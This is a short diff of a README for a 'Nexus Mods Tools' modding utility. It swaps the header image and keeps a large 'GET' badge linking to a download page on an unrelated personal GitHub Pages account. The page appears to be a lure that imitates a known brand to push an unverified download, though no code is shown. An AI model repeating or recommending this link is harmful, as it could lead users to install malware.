@@ -1,6 +1,6 @@
 # Nexus Mods Tools — Game Modding, Load Orders & Mod Management
 
-![Nexus Mods](https://ss.sport-express.ru/userfiles/materials/212/2121807/1180x665.jpg)
+![Nexus Mods](https://i.playground.ru/p/ds8gkTXWE8tqY2dotszHjQ.png)
 
 [![GET — Nexus Mods Tools](https://img.shields.io/badge/GET%20%E2%80%94%20Nexus%20Mods%20Tools-0078D6?style=for-the-badge&logoColor=white)](https://amandababystuff1.github.io/.github/Nexus-Mods-Tools)
 
